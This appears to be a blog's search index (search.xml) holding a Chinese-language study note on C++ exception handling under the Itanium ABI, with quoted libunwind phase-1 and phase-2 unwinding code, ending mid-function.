<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title></title>
    <url>/2024/09/14/iot/iot%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>异常处理机制</title>
    <url>/2024/09/10/ABI/c++%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<blockquote>
<p>以Itanium C++ ABI为例子，其为类unix操作系统普遍使用的c++ABI标准</p>
</blockquote>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://itanium-cxx-abi.github.io/cxx-abi/abi-eh.html#base-framework">https://itanium-cxx-abi.github.io/cxx-abi/abi-eh.html#base-framework</a></p>
<p><a href="https://maskray.me/blog/2020-12-12-c++-exception-handling-abi#%E4%B8%AD%E6%96%87%E7%89%88">https://maskray.me/blog/2020-12-12-c++-exception-handling-abi#%E4%B8%AD%E6%96%87%E7%89%88</a></p>
<h2 id="一-BASE-ABI"><a href="#一-BASE-ABI" class="headerlink" title="一.BASE ABI"></a>一.BASE ABI</h2><blockquote>
<p>所有语言和实现通用的接口;感觉写的很混乱就做个参考吧</p>
</blockquote>
<h3 id="1-符合psABI架构的处理器的运行时库需要提供的接口"><a href="#1-符合psABI架构的处理器的运行时库需要提供的接口" class="headerlink" title="1.符合psABI架构的处理器的运行时库需要提供的接口"></a>1.符合psABI架构的处理器的运行时库需要提供的接口</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_Unwind_RaiseException,</span><br><span class="line">_Unwind_Resume,</span><br><span class="line">_Unwind_DeleteException,</span><br><span class="line">_Unwind_GetGR,</span><br><span class="line">_Unwind_SetGR,</span><br><span class="line">_Unwind_GetIP,</span><br><span class="line">_Unwind_SetIP,</span><br><span class="line">_Unwind_GetRegionStart,</span><br><span class="line">_Unwind_GetLanguageSpecificData,</span><br><span class="line">_Unwind_ForcedUnwind</span><br></pre></td></tr></table></figure>

<p>另外，定义了两种数据类型（_Unwind_Context 和 _Unwind_Exception），用于连接调用运行时（如 C++ 运行时）与上述例程的接口。所有例程和接口的行为都如同是用 <code>extern &quot;C&quot;</code> 定义的一样，特别是这些名称不会被修饰。作为此接口的一部分，所有定义的名称都以 “<em>Unwind</em>“ 作为前缀。</p>
<p>最后，编译器会在需要异常处理的栈帧的展开描述符中存储一个语言和供应商特定的 personality 函数。展开器（unwinder）会调用 personality 函数来处理特定语言的任务，例如识别处理特定异常的栈帧。</p>
<h3 id="2-Data-Structures详解"><a href="#2-Data-Structures详解" class="headerlink" title="2.Data Structures详解"></a>2.Data Structures详解</h3><h4 id="Reason-Codes"><a href="#Reason-Codes" class="headerlink" title="Reason Codes"></a><strong>Reason Codes</strong></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">	_URC_NO_REASON = <span class="number">0</span>,</span><br><span class="line">	_URC_FOREIGN_EXCEPTION_CAUGHT = <span class="number">1</span>,</span><br><span class="line">	_URC_FATAL_PHASE2_ERROR = <span class="number">2</span>,</span><br><span class="line">	_URC_FATAL_PHASE1_ERROR = <span class="number">3</span>,</span><br><span class="line">	_URC_NORMAL_STOP = <span class="number">4</span>,</span><br><span class="line">	_URC_END_OF_STACK = <span class="number">5</span>,</span><br><span class="line">	_URC_HANDLER_FOUND = <span class="number">6</span>,</span><br><span class="line">	_URC_INSTALL_CONTEXT = <span class="number">7</span>,</span><br><span class="line">	_URC_CONTINUE_UNWIND = <span class="number">8</span></span><br><span class="line">    &#125; _Unwind_Reason_Code;</span><br></pre></td></tr></table></figure>

<h4 id="Exception-Header"><a href="#Exception-Header" class="headerlink" title="Exception Header"></a><strong>Exception Header</strong></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*_Unwind_Exception_Cleanup_Fn)</span></span><br><span class="line">		<span class="params">(_Unwind_Reason_Code reason,</span></span><br><span class="line"><span class="params">		 <span class="keyword">struct</span> _Unwind_Exception *exc)</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">Unwind_Exception</span> &#123;</span></span><br><span class="line">    uint64			 exception_class; <span class="comment">//特定语言和实现的标识符， It allows a personality routine to distinguish between native and foreign exceptions</span></span><br><span class="line">    _Unwind_Exception_Cleanup_Fn exception_cleanup; <span class="comment">//当异常对象被删除会调用此</span></span><br><span class="line">    uint64			 private_1; <span class="comment">// 存储内部信息</span></span><br><span class="line">    uint64			 private_2; <span class="comment">// 存储内部信息</span></span><br><span class="line">&#125;;</span><br><span class="line">展开器（unwinder）在处理异常时，通过这个头部来识别和管理异常对象，确保在异常处理完毕后正确地释放资源。</span><br></pre></td></tr></table></figure>

<h4 id="Unwind-Context"><a href="#Unwind-Context" class="headerlink" title="Unwind Context"></a><strong>Unwind Context</strong></h4><h3 id="3-Throwing-an-Exception1"><a href="#3-Throwing-an-Exception1" class="headerlink" title="3.Throwing an Exception1"></a>3.Throwing an Exception1</h3><blockquote>
<p><strong>查找异常处理器</strong>：先查找是否有栈帧可以处理异常（阶段 1）。</p>
<p><strong>展开栈与清理</strong>：如果找到处理器，则沿着调用栈展开并执行清理操作（阶段 2）。</p>
<p>此函数是两阶段的结合。</p>
</blockquote>
<blockquote>
<p><code>_Unwind_RaiseException</code> 是一个函数，用于抛出一个异常。它会接收一个异常对象作为参数，这个异常对象必须包含一个已设置的 <code>exception_class</code> 字段和 <code>exception_cleanup</code> 字段。这些字段在抛出异常之前由特定语言的运行时设置。</p>
<p>异常对象通常是由特定语言的运行时（如 C++ 的运行时）分配和初始化的。尽管这个异常对象的结构可以根据不同的语言有所不同，但它必须包含一个 <code>_Unwind_Exception</code> 结构体，作为异常处理过程的基础部分。</p>
<p>只有在发生错误时， <code>_Unwind_RaiseException</code> 才会返回。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_Unwind_Reason_Code _Unwind_RaiseException</span><br><span class="line">	      ( <span class="keyword">struct</span> _Unwind_Exception *exception_object );</span><br></pre></td></tr></table></figure>

<blockquote>
<p>可能遇到的部分错误码：</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_URC_END_OF_STACK：展开器在阶段 <span class="number">1</span> 中遇到了堆栈的末尾，但没有找到处理程序。展开运行时不会修改堆栈。在这种情况下，C++运行时通常会调用 uncaught_exception（）。</span><br><span class="line">_URC_FATAL_PHASE1_ERROR：展开器在阶段 <span class="number">1</span> 中遇到意外错误，例如堆栈损坏。展开运行时不会修改堆栈。在这种情况下，C++ 运行时通常会调用 <span class="built_in">terminate</span>（）。</span><br><span class="line">   如果展开器在第 <span class="number">2</span> 阶段遇到意外错误，则应将 _URC_FATAL_PHASE2_ERROR 返回给其调用方。 在 C++ 中，这通常是 __cxa_throw，它将调用 <span class="built_in">terminate</span>（）。</span><br></pre></td></tr></table></figure>

<h3 id="3-Throwing-an-Exception2"><a href="#3-Throwing-an-Exception2" class="headerlink" title="3.Throwing an Exception2"></a>3.Throwing an Exception2</h3><blockquote>
<p>此部分主要用于资源清理。而非异常处理，只有一个阶段，那就是栈展开，没有search操作</p>
<p>具体细节，用时再说</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> _Unwind_Reason_Code (*_Unwind_Stop_Fn)</span><br><span class="line">		(<span class="type">int</span> version,</span><br><span class="line">		 _Unwind_Action actions,</span><br><span class="line">		 uint64 exceptionClass,</span><br><span class="line">		 <span class="keyword">struct</span> _Unwind_Exception *exceptionObject,</span><br><span class="line">		 <span class="keyword">struct</span> _Unwind_Context *context,</span><br><span class="line">		 <span class="type">void</span> *stop_parameter );</span><br><span class="line"></span><br><span class="line">    _Unwind_Reason_Code _Unwind_ForcedUnwind</span><br><span class="line">	      ( <span class="keyword">struct</span> _Unwind_Exception *exception_object,</span><br><span class="line">		_Unwind_Stop_Fn stop,</span><br><span class="line">		<span class="type">void</span> *stop_parameter );</span><br></pre></td></tr></table></figure>

<h3 id="3-1-Unwind-Resume"><a href="#3-1-Unwind-Resume" class="headerlink" title="3.1_Unwind_Resume"></a>3.1_Unwind_Resume</h3><blockquote>
<p>对异常处理的第二阶段的补充，用于恢复异常的传播，如多个catch捕捉异常</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> _Unwind_Resume (<span class="keyword">struct</span> _Unwind_Exception *exception_object);</span><br></pre></td></tr></table></figure>

<h3 id="4-Exception-Object-Management"><a href="#4-Exception-Object-Management" class="headerlink" title="4.Exception Object Management"></a>4.Exception Object Management</h3><h4 id="4-1-Unwind-DeleteException"><a href="#4-1-Unwind-DeleteException" class="headerlink" title="4.1_Unwind_DeleteException"></a>4.1_Unwind_DeleteException</h4><blockquote>
<p>这个函数会调用 <code>exception_object</code> 结构体中的 <code>exception_cleanup</code> 函数指针，执行特定语言或实现的清理操作，以确保异常对象中可能占用的资源（如动态分配的内存）被正确释放。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> _Unwind_DeleteException</span><br><span class="line">	      (<span class="keyword">struct</span> _Unwind_Exception *exception_object);</span><br></pre></td></tr></table></figure>

<h3 id="5-Context-Management"><a href="#5-Context-Management" class="headerlink" title="5.Context Management"></a>5.Context Management</h3><blockquote>
<p>用于返回栈帧与寄存器信息</p>
</blockquote>
<h3 id="6-Personality-Routine"><a href="#6-Personality-Routine" class="headerlink" title="6. Personality Routine"></a>6. Personality Routine</h3><blockquote>
<p>对底层baseABI的封装，通过展开信息块的指针来引用。</p>
<h5 id="Transferring-Control-to-a-Landing-Pad：通过上下文保存的指针"><a href="#Transferring-Control-to-a-Landing-Pad：通过上下文保存的指针" class="headerlink" title="Transferring Control to a Landing Pad：通过上下文保存的指针"></a>Transferring Control to a Landing Pad：通过上下文保存的指针</h5></blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_Unwind_Reason_Code (*__personality_routine)</span><br><span class="line"> (<span class="type">int</span> version,</span><br><span class="line">  _Unwind_Action actions, <span class="comment">//action</span></span><br><span class="line">  uint64 exceptionClass, <span class="comment">//类型</span></span><br><span class="line">  <span class="keyword">struct</span> _Unwind_Exception *exceptionObject,</span><br><span class="line">  <span class="keyword">struct</span> _Unwind_Context *context);</span><br></pre></td></tr></table></figure>

<h2 id="二-C-ABI"><a href="#二-C-ABI" class="headerlink" title="二 C++ABI"></a>二 C++ABI</h2><h3 id="1-Data-Structures"><a href="#1-Data-Structures" class="headerlink" title="1. Data Structures"></a>1. Data Structures</h3><h4 id="Caught-Exception-Stack"><a href="#Caught-Exception-Stack" class="headerlink" title="Caught Exception Stack"></a>Caught Exception Stack</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">cxa_eh_globals</span> &#123;</span></span><br><span class="line">__cxa_exception *	caughtExceptions;<span class="comment">//当前线程引发和捕获的异常列表</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>		uncaughtExceptions; <span class="comment">//未捕获的异常计数</span></span><br><span class="line">     &#125;;</span><br></pre></td></tr></table></figure>

<h4 id="C-Exception-Objects"><a href="#C-Exception-Objects" class="headerlink" title="C++ Exception Objects"></a>C++ Exception Objects</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">cxa_exception</span> &#123;</span> </span><br><span class="line"><span class="built_in">std</span>::type_info *	exceptionType;</span><br><span class="line"><span class="type">void</span> (*exceptionDestructor) (<span class="type">void</span> *); </span><br><span class="line">unexpected_handler	unexpectedHandler;</span><br><span class="line">terminate_handler	terminateHandler;</span><br><span class="line">__cxa_exception *	nextException;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>			handlerCount;</span><br><span class="line"><span class="type">int</span>			handlerSwitchValue;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *		actionRecord;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *		languageSpecificData;</span><br><span class="line"><span class="type">void</span> *			catchTemp;</span><br><span class="line"><span class="type">void</span> *			adjustedPtr;</span><br><span class="line"></span><br><span class="line">_Unwind_Exception	unwindHeader;</span><br><span class="line">     &#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2-过程（算法）"><a href="#2-过程（算法）" class="headerlink" title="2.过程（算法）"></a>2.过程（算法）</h3><h4 id="Throwing-an-Exception"><a href="#Throwing-an-Exception" class="headerlink" title="Throwing an Exception"></a>Throwing an Exception</h4><h5 id="1-Allocating-the-Exception-Object"><a href="#1-Allocating-the-Exception-Object" class="headerlink" title="1.Allocating the Exception Object"></a>1.Allocating the Exception Object</h5><blockquote>
<p><a href="https://itanium-cxx-abi.github.io/cxx-abi/abi-eh.html#base-personality">https://itanium-cxx-abi.github.io/cxx-abi/abi-eh.html#base-personality</a></p>
<p>调用：void *__cxa_allocate_exception(size_t thrown_size);</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">+---------------------+----------------------+</span><br><span class="line">| __cxa_exception 标头 |  实际的异常对象数据  |</span><br><span class="line">+---------------------+----------------------+</span><br><span class="line">^                     ^</span><br><span class="line">|                     |</span><br><span class="line">|                     +-- 通过 __cxa_allocate_exception 返回的指针</span><br><span class="line">|</span><br><span class="line">+-- 标头起始地址，通常通过从异常对象指针减去一个固定偏移量得到</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="2-Throwing-the-Exception-Object"><a href="#2-Throwing-the-Exception-Object" class="headerlink" title="2.Throwing the Exception Object"></a>2.Throwing the Exception Object</h5><blockquote>
<p><a href="https://itanium-cxx-abi.github.io/cxx-abi/abi-eh.html#base-personality">https://itanium-cxx-abi.github.io/cxx-abi/abi-eh.html#base-personality</a></p>
<p>调用： void __cxa_throw (void *thrown_exception, std::type_info *tinfo, void (*dest) (void *) );This routine never returns.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span><span class="comment">/*获得标头*/</span></span><br><span class="line">__cxa_exception *header = ((__cxa_exception *) thrown_exception - <span class="number">1</span>);</span><br><span class="line"><span class="number">2.</span><span class="comment">/*将当前 unexpected_handler 和 terminate_handler 保存在 __cxa_exception 标头中。*/</span></span><br><span class="line"><span class="number">3.</span><span class="comment">/*将 tinfo 和 dest 参数保存在 __cxa_exception 标头中。*/</span></span><br><span class="line"><span class="number">4.</span><span class="comment">/*在 unwind 标头中设置 exception_class 字段。这是一个 64 位值，表示 ASCII 字符串 “XXXXC++\0”，其中 “XXXX” 是与供应商相关的字符串。也就是说，对于符合此 ABI 的实现，此 64 位值的低序 4 字节将为“C++\0”。*/</span></span><br><span class="line"><span class="number">5.</span><span class="comment">/*递增 uncaught_exception 标志。*/</span>    </span><br><span class="line"><span class="comment">//简化实现</span></span><br><span class="line"><span class="type">void</span> __cxa_throw(<span class="type">void</span> *thrown, <span class="built_in">std</span>::type_info *tinfo, <span class="type">void</span> (*destructor)(<span class="type">void</span> *)) &#123;</span><br><span class="line">  __cxa_exception *hdr = (__cxa_exception *)thrown - <span class="number">1</span>;</span><br><span class="line">  hdr-&gt;exceptionType = tinfo; hdr-&gt;destructor = destructor;</span><br><span class="line">  hdr-&gt;unexpectedHandler = <span class="built_in">std</span>::get_unexpected();</span><br><span class="line">  hdr-&gt;terminateHandler = <span class="built_in">std</span>::get_terminate();</span><br><span class="line">  hdr-&gt;unwindHeader.exception_class = ...;</span><br><span class="line">  __cxa_get_globals()-&gt;uncaughtExceptions++;</span><br><span class="line">  _Unwind_RaiseException(&amp;hdr-&gt;unwindHeader);</span><br><span class="line">  <span class="comment">// Failed to unwind, e.g. the .eh_frame FDE is absent.</span></span><br><span class="line">  __cxa_begin_catch(&amp;hdr-&gt;unwindHeader);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">terminate</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="3-Unwind-RaiseException"><a href="#3-Unwind-RaiseException" class="headerlink" title="3._Unwind_RaiseException"></a>3._Unwind_RaiseException</h5><blockquote>
<p>此过程是baseabi的throw的两阶段。会调用此函数</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_Unwind_Reason_Code (*__personality_routine)</span><br><span class="line">    (<span class="type">int</span> version,</span><br><span class="line">     _Unwind_Action actions,</span><br><span class="line">     uint64 exceptionClass,</span><br><span class="line">     <span class="keyword">struct</span> _Unwind_Exception *exceptionObject,</span><br><span class="line">     <span class="keyword">struct</span> _Unwind_Context *context);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>phase1</p>
</blockquote>
<blockquote>
<p>会通过光标来寻找<code>__personality_routine</code>,找到则进行调用，根据返回值是否找到hander来进行下一步操作（返回，或者继续展开），若返回的话那么<code>_Unwind_Exception</code>的private_2则会记住栈指针，指向具体的catch块的位置，以便于正确使用变量。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> _Unwind_Reason_Code</span><br><span class="line"><span class="title function_">unwind_phase1</span><span class="params">(<span class="type">unw_context_t</span> *uc, <span class="type">unw_cursor_t</span> *cursor, _Unwind_Exception *exception_object)</span> &#123;</span><br><span class="line">  __unw_init_local(cursor, uc);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Walk each frame looking for a place to stop.</span></span><br><span class="line">  <span class="type">bool</span> handlerNotFound = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">while</span> (handlerNotFound) &#123;</span><br><span class="line">    <span class="comment">// Ask libunwind to get next frame (skip over first which is</span></span><br><span class="line">    <span class="comment">// _Unwind_RaiseException).</span></span><br><span class="line">    <span class="type">int</span> stepResult = __unw_step(cursor);</span><br><span class="line">    <span class="keyword">if</span> (stepResult == <span class="number">0</span>) &#123;</span><br><span class="line">      _LIBUNWIND_TRACE_UNWINDING(</span><br><span class="line">          <span class="string">&quot;unwind_phase1(ex_ojb=%p): __unw_step() reached &quot;</span></span><br><span class="line">          <span class="string">&quot;bottom =&gt; _URC_END_OF_STACK&quot;</span>,</span><br><span class="line">          (<span class="type">void</span> *)exception_object);</span><br><span class="line">      <span class="keyword">return</span> _URC_END_OF_STACK;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (stepResult &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      _LIBUNWIND_TRACE_UNWINDING(</span><br><span class="line">          <span class="string">&quot;unwind_phase1(ex_ojb=%p): __unw_step failed =&gt; &quot;</span></span><br><span class="line">          <span class="string">&quot;_URC_FATAL_PHASE1_ERROR&quot;</span>,</span><br><span class="line">          (<span class="type">void</span> *)exception_object);</span><br><span class="line">      <span class="keyword">return</span> _URC_FATAL_PHASE1_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// See if frame has code to run (has personality routine).</span></span><br><span class="line">    <span class="type">unw_proc_info_t</span> frameInfo;</span><br><span class="line">    <span class="type">unw_word_t</span> sp;</span><br><span class="line">    <span class="keyword">if</span> (__unw_get_proc_info(cursor, &amp;frameInfo) != UNW_ESUCCESS) &#123;</span><br><span class="line">      _LIBUNWIND_TRACE_UNWINDING(</span><br><span class="line">          <span class="string">&quot;unwind_phase1(ex_ojb=%p): __unw_get_proc_info &quot;</span></span><br><span class="line">          <span class="string">&quot;failed =&gt; _URC_FATAL_PHASE1_ERROR&quot;</span>,</span><br><span class="line">          (<span class="type">void</span> *)exception_object);</span><br><span class="line">      <span class="keyword">return</span> _URC_FATAL_PHASE1_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// When tracing, print state information.</span></span><br><span class="line">    <span class="keyword">if</span> (_LIBUNWIND_TRACING_UNWINDING) &#123;</span><br><span class="line">      <span class="type">char</span> functionBuf[<span class="number">512</span>];</span><br><span class="line">      <span class="type">const</span> <span class="type">char</span> *functionName = functionBuf;</span><br><span class="line">      <span class="type">unw_word_t</span> offset;</span><br><span class="line">      <span class="keyword">if</span> ((__unw_get_proc_name(cursor, functionBuf, <span class="keyword">sizeof</span>(functionBuf),</span><br><span class="line">                               &amp;offset) != UNW_ESUCCESS) ||</span><br><span class="line">          (frameInfo.start_ip + offset &gt; frameInfo.end_ip))</span><br><span class="line">        functionName = <span class="string">&quot;.anonymous.&quot;</span>;</span><br><span class="line">      <span class="type">unw_word_t</span> pc;</span><br><span class="line">      __unw_get_reg(cursor, UNW_REG_IP, &amp;pc);</span><br><span class="line">      _LIBUNWIND_TRACE_UNWINDING(</span><br><span class="line">          <span class="string">&quot;unwind_phase1(ex_ojb=%p): pc=0x%&quot;</span> PRIxPTR <span class="string">&quot;, start_ip=0x%&quot;</span> PRIxPTR</span><br><span class="line">          <span class="string">&quot;, func=%s, lsda=0x%&quot;</span> PRIxPTR <span class="string">&quot;, personality=0x%&quot;</span> PRIxPTR <span class="string">&quot;&quot;</span>,</span><br><span class="line">          (<span class="type">void</span> *)exception_object, pc, frameInfo.start_ip, functionName,</span><br><span class="line">          frameInfo.lsda, frameInfo.handler);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If there is a personality routine, ask it if it will want to stop at</span></span><br><span class="line">    <span class="comment">// this frame.</span></span><br><span class="line">    <span class="keyword">if</span> (frameInfo.handler != <span class="number">0</span>) &#123;</span><br><span class="line">      __personality_routine p =</span><br><span class="line">          (__personality_routine)(<span class="type">uintptr_t</span>)(frameInfo.handler);</span><br><span class="line">      _LIBUNWIND_TRACE_UNWINDING(</span><br><span class="line">          <span class="string">&quot;unwind_phase1(ex_ojb=%p): calling personality function %p&quot;</span>,</span><br><span class="line">          (<span class="type">void</span> *)exception_object, (<span class="type">void</span> *)(<span class="type">uintptr_t</span>)p);</span><br><span class="line">      _Unwind_Reason_Code personalityResult =</span><br><span class="line">          (*p)(<span class="number">1</span>, _UA_SEARCH_PHASE, exception_object-&gt;exception_class,</span><br><span class="line">               exception_object, (<span class="keyword">struct</span> _Unwind_Context *)(cursor));</span><br><span class="line">      <span class="keyword">switch</span> (personalityResult) &#123;</span><br><span class="line">      <span class="keyword">case</span> _URC_HANDLER_FOUND:</span><br><span class="line">        <span class="comment">//	 found a catch clause or locals that need destructing in this frame</span></span><br><span class="line">        <span class="comment">// stop search and remember stack pointer at the frame</span></span><br><span class="line">        handlerNotFound = <span class="literal">false</span>;</span><br><span class="line">        __unw_get_reg(cursor, UNW_REG_SP, &amp;sp);</span><br><span class="line">        exception_object-&gt;private_2 = (<span class="type">uintptr_t</span>)sp;</span><br><span class="line">        _LIBUNWIND_TRACE_UNWINDING(</span><br><span class="line">            <span class="string">&quot;unwind_phase1(ex_ojb=%p): _URC_HANDLER_FOUND&quot;</span>,</span><br><span class="line">            (<span class="type">void</span> *)exception_object);</span><br><span class="line">        <span class="keyword">return</span> _URC_NO_REASON;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> _URC_CONTINUE_UNWIND:</span><br><span class="line">        _LIBUNWIND_TRACE_UNWINDING(</span><br><span class="line">            <span class="string">&quot;unwind_phase1(ex_ojb=%p): _URC_CONTINUE_UNWIND&quot;</span>,</span><br><span class="line">            (<span class="type">void</span> *)exception_object);</span><br><span class="line">        <span class="comment">// continue unwinding</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">// something went wrong</span></span><br><span class="line">        _LIBUNWIND_TRACE_UNWINDING(</span><br><span class="line">            <span class="string">&quot;unwind_phase1(ex_ojb=%p): _URC_FATAL_PHASE1_ERROR&quot;</span>,</span><br><span class="line">            (<span class="type">void</span> *)exception_object);</span><br><span class="line">        <span class="keyword">return</span> _URC_FATAL_PHASE1_ERROR;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> _URC_NO_REASON;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>phase2</p>
<p>**初始化光标 (<code>cursor</code>)**：</p>
<ul>
<li>函数首先通过 <code>__unw_init_local(cursor, uc)</code> 初始化光标，以便在当前上下文中遍历堆栈帧。光标用于跟踪堆栈展开过程中的当前栈帧。</li>
</ul>
<p><strong>遍历栈帧</strong>：</p>
<ul>
<li>函数进入一个循环，调用 <code>__unw_step(cursor)</code> 来遍历堆栈帧。如果返回值为 0，表示已经到达堆栈的底部，函数返回 <code>_URC_END_OF_STACK</code>，表示堆栈展开已经完成。</li>
<li>如果 <code>__unw_step(cursor)</code> 返回负值，表示在移动到下一个栈帧时发生了错误，函数返回 <code>_URC_FATAL_PHASE2_ERROR</code>，表示在第二阶段遇到致命错误。</li>
</ul>
<p><strong>获取栈帧信息</strong>：</p>
<ul>
<li>对于每个栈帧，函数调用 <code>__unw_get_proc_info(cursor, &amp;frameInfo)</code> 来获取与该栈帧相关联的处理信息（如程序计数器、栈指针等）。如果获取信息失败，函数返回 <code>_URC_FATAL_PHASE2_ERROR</code>。</li>
</ul>
<p>**检查栈帧中的 <code>personality routine</code>**：</p>
<ul>
<li>如果当前栈帧有 <code>personality routine</code>（即 <code>frameInfo.handler</code> 不为 0），函数将调用它来决定如何处理该栈帧。</li>
<li>如果栈指针 <code>sp</code> 等于 <code>exception_object-&gt;private_2</code>，表示这个栈帧是在第一阶段中标记为需要处理的栈帧，函数会向 <code>personality routine</code> 传递 <code>_UA_HANDLER_FRAME</code> 标志，指示这是一个需要处理的帧。</li>
</ul>
<p><strong>处理 <code>personality routine</code> 的返回值</strong>：</p>
<ul>
<li><pre><code>personality routine
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">   可能返回以下几种结果：</span><br><span class="line"></span><br><span class="line">  - **_URC_CONTINUE_UNWIND**：继续展开堆栈，函数将继续遍历下一个栈帧。</span><br><span class="line">  - **_URC_INSTALL_CONTEXT**：`personality routine` 指示需要转移控制权到异常处理器，函数调用 `__unw_resume(cursor)` 将控制权转移到处理器。如果 `__unw_resume` 返回，表示发生了错误，函数返回 `_URC_FATAL_PHASE2_ERROR`。</span><br><span class="line"></span><br><span class="line">**错误处理**：</span><br><span class="line"></span><br><span class="line">- 如果在遍历栈帧的过程中发生任何无法处理的错误，函数会记录错误信息并返回 `_URC_FATAL_PHASE2_ERROR`。</span><br><span class="line"></span><br><span class="line">```C</span><br><span class="line">static _Unwind_Reason_Code</span><br><span class="line">unwind_phase2(unw_context_t *uc, unw_cursor_t *cursor, _Unwind_Exception *exception_object) &#123;</span><br><span class="line"> __unw_init_local(cursor, uc);</span><br><span class="line"></span><br><span class="line"> _LIBUNWIND_TRACE_UNWINDING(&quot;unwind_phase2(ex_ojb=%p)&quot;,</span><br><span class="line">                            (void *)exception_object);</span><br><span class="line"></span><br><span class="line"> // Walk each frame until we reach where search phase said to stop.</span><br><span class="line"> while (true) &#123;</span><br><span class="line"></span><br><span class="line">   // Ask libunwind to get next frame (skip over first which is</span><br><span class="line">   // _Unwind_RaiseException).</span><br><span class="line">   int stepResult = __unw_step(cursor);</span><br><span class="line">   if (stepResult == 0) &#123;</span><br><span class="line">     _LIBUNWIND_TRACE_UNWINDING(</span><br><span class="line">         &quot;unwind_phase2(ex_ojb=%p): __unw_step() reached &quot;</span><br><span class="line">         &quot;bottom =&gt; _URC_END_OF_STACK&quot;,</span><br><span class="line">         (void *)exception_object);</span><br><span class="line">     return _URC_END_OF_STACK;</span><br><span class="line">   &#125; else if (stepResult &lt; 0) &#123;</span><br><span class="line">     _LIBUNWIND_TRACE_UNWINDING(</span><br><span class="line">         &quot;unwind_phase2(ex_ojb=%p): __unw_step failed =&gt; &quot;</span><br><span class="line">         &quot;_URC_FATAL_PHASE1_ERROR&quot;,</span><br><span class="line">         (void *)exception_object);</span><br><span class="line">     return _URC_FATAL_PHASE2_ERROR;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   // Get info about this frame.</span><br><span class="line">   unw_word_t sp;</span><br><span class="line">   unw_proc_info_t frameInfo;</span><br><span class="line">   __unw_get_reg(cursor, UNW_REG_SP, &amp;sp);</span><br><span class="line">   if (__unw_get_proc_info(cursor, &amp;frameInfo) != UNW_ESUCCESS) &#123;</span><br><span class="line">     _LIBUNWIND_TRACE_UNWINDING(</span><br><span class="line">         &quot;unwind_phase2(ex_ojb=%p): __unw_get_proc_info &quot;</span><br><span class="line">         &quot;failed =&gt; _URC_FATAL_PHASE1_ERROR&quot;,</span><br><span class="line">         (void *)exception_object);</span><br><span class="line">     return _URC_FATAL_PHASE2_ERROR;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   // When tracing, print state information.</span><br><span class="line">   if (_LIBUNWIND_TRACING_UNWINDING) &#123;</span><br><span class="line">     char functionBuf[512];</span><br><span class="line">     const char *functionName = functionBuf;</span><br><span class="line">     unw_word_t offset;</span><br><span class="line">     if ((__unw_get_proc_name(cursor, functionBuf, sizeof(functionBuf),</span><br><span class="line">                              &amp;offset) != UNW_ESUCCESS) ||</span><br><span class="line">         (frameInfo.start_ip + offset &gt; frameInfo.end_ip))</span><br><span class="line">       functionName = &quot;.anonymous.&quot;;</span><br><span class="line">     _LIBUNWIND_TRACE_UNWINDING(&quot;unwind_phase2(ex_ojb=%p): start_ip=0x%&quot; PRIxPTR</span><br><span class="line">                                &quot;, func=%s, sp=0x%&quot; PRIxPTR &quot;, lsda=0x%&quot; PRIxPTR</span><br><span class="line">                                &quot;, personality=0x%&quot; PRIxPTR,</span><br><span class="line">                                (void *)exception_object, frameInfo.start_ip,</span><br><span class="line">                                functionName, 